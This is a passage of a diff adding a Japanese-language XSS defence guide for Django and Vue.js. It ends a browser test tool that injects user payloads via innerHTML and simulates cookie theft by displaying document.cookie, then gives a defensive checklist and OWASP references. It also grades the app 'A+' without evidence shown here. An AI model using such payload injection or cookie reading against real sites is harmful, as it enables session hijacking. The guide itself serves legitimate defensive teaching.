+            showResult(`🔗 Reflected XSSテスト用URL:\n${testUrl}\n\n新しいタブで開いてテストしてください。`, true);
+            
+            // オプション: 自動で開く
+            // window.open(testUrl, '_blank');
+        }
+
+        function testDOM() {
+            const payload = document.getElementById('payload').value;
+
+            if (!payload) {
+                showResult('❌ ペイロードを入力してください', false);
+                return;
+            }
+
+            // DOM-based XSSのシミュレーション
+            const testDiv = document.createElement('div');
+            testDiv.style.display = 'none';
+            
+            try {
+                // 危険な操作（テスト目的）
+                testDiv.innerHTML = payload;
+                document.body.appendChild(testDiv);
+                
+                showResult('⚠️ DOM-based XSSテスト: ペイロードを挿入しました（非表示）', false);
+                
+                // すぐに削除
+                setTimeout(() => {
+                    document.body.removeChild(testDiv);
+                }, 1000);
+            } catch (error) {
+                showResult('✅ ブラウザがブロック: ' + error.message, true);
+            }
+        }
+
+        function testCookieSteal() {
+            const cookies = document.cookie;
+            
+            if (!cookies) {
+                showResult('✅ Cookieが存在しないか、HTTPOnlyで保護されています', true);
+                return;
+            }
+
+            // シミュレーション（実際には送信しない）
+            showResult(
+                `⚠️ Cookie盗難シミュレーション:\n` +
+                `もし攻撃者のサイトだった場合、以下が送信されます:\n\n` +
+                `${cookies}\n\n` +
+                `対策: SESSION_COOKIE_HTTPONLY = True`,
+                false
+            );
+
+            console.log('盗難シミュレーション - Cookie:', cookies);
+        }
+
+        // ページ読み込み時
+        window.onload = () => {
+            console.log('%c⚠️ XSS脆弱性テストツール', 'color: red; font-size: 20px; font-weight: bold;');
+            console.log('このツールは教育目的のみで使用してください');
+            showCookies();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+## 実践的な防御チェックリスト
+
+### 開発時のチェックリスト
+
+```markdown
+## Django側
+
+- [ ] テンプレートの自動エスケープが有効
+- [ ] HttpResponse での直接HTML出力を避ける
+- [ ] mark_safe() 使用時は必ずサニタイズ
+- [ ] ユーザー入力をそのままHTMLに埋め込まない
+- [ ] DRF使用時はシリアライザーを経由
+- [ ] Content Security Policy ヘッダーを設定
+- [ ] HTTPOnly Cookie を有効化
+
+## Vue.js側
+
+- [ ] v-html の使用を避ける
+- [ ] 必要な場合はDOMPurifyでサニタイズ
+- [ ] テンプレート構文 {{ }} を使用
+- [ ] 直接DOM操作（innerHTML等）を避ける
+- [ ] URLパラメータを検証
+- [ ] javascript: URI を拒否
+- [ ] eval() や new Function() を使用しない
+
+## API設計
+
+- [ ] JSON形式でやり取り
+- [ ] 入力検証を実装
+- [ ] 出力エンコーディングを実施
+- [ ] エラーメッセージで機密情報を漏らさない
+
+## 本番環境
+
+- [ ] DEBUG = False
+- [ ] CSP ヘッダーを厳格に設定
+- [ ] HTTPS 必須
+- [ ] セキュリティヘッダーを全て設定
+- [ ] 定期的なセキュリティ監査
+```
+
+---
+
+## まとめ
+
+### XSSの本質
+
+```
+┌────────────────────────────────────────────────────────┐
+│                  XSS攻撃の仕組み                        │
+└────────────────────────────────────────────────────────┘
+
+1. 攻撃者が悪意あるスクリプトを注入
+   ↓
+2. サーバーが検証なしで保存/反映
+   ↓
+3. 被害者のブラウザがスクリプトを実行
+   ↓
+4. Cookie盗難、セッション乗っ取り、情報漏洩
+
+防御の鍵:
+  - 入力検証（Input Validation）
+  - 出力エスケープ（Output Encoding）
+  - CSP（Content Security Policy）
+```
+
+### Django + Vue.js の防御は強力！
+
+```
+✅ Django:
+  - テンプレート自動エスケープ
+  - DRF で JSON API
+  - bleach でサニタイズ
+
+✅ Vue.js:
+  - テンプレート自動エスケープ
+  - v-html 回避
+  - DOMPurify導入可能
+
+✅ 追加対策:
+  - CSP ヘッダー
+  - HTTPOnly Cookie
+  - セキュリティヘッダー
+
+総合評価: A+ 🌟🌟🌟🌟🌟
+あなたのアプリは適切に防御されています！
+```
+
+### 重要なポイント
+
+1. **ユーザー入力は決して信頼しない**
+   - すべての入力は悪意があると仮定
+
+2. **出力時に必ずエスケープ**
+   - Django: `{{ variable }}` (自動)
+   - Vue.js: `{{ variable }}` (自動)
+
+3. **HTMLが必要な場合はサニタイズ**
+   - Django: `bleach.clean()`
+   - Vue.js: `DOMPurify.sanitize()`
+
+4. **危険な関数を避ける**
+   - `v-html`, `innerHTML`, `eval()`
+
+5. **多層防御**
+   - エスケープ + CSP + HTTPOnly Cookie
+
+**あなたのアプリは基本的な防御が完璧です！** ✨
+
+追加でCSPヘッダーやDOMPurifyを導入すると、さらに強固になりますよ (๑•̀ㅂ•́)و✧
+
+---
+
+## 参考資料
+
+### 公式ドキュメント
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
+- [Vue.js Security](https://vuejs.org/guide/best-practices/security.html)
+- [MDN: Cross-site scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
+
+### ツール
+- [DOMPurify](https://github.com/cure53/DOMPurify)
+- [bleach](https://bleach.readthedocs.io/)
+- [django-csp](https://django-csp.readthedocs.io/)
+- [OWASP ZAP](https://www.zaproxy.org/)
+
+### 学習リソース
+- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
